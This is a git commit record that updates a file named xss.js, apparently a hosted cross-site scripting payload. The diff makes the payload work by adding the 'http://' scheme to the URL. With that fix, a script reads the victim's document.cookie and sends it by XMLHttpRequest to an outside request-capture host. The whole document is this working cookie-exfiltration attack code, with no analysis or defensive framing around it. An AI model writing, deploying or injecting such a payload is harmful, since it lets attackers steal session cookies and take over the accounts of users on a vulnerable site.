a6deb1dde7e7ad14574d682732151e140154dbd2
manrop2702 <63361845+manrop2702@users.noreply.github.com>
2023-10-06 19:16:33 +0700

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,3 +1,3 @@
 var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'b7ot2ht6.requestrepo.com/?cc=' + document.cookie, true);
+xhttp.open('GET', 'http://b7ot2ht6.requestrepo.com/?cc=' + document.cookie, true);
 xhttp.send();
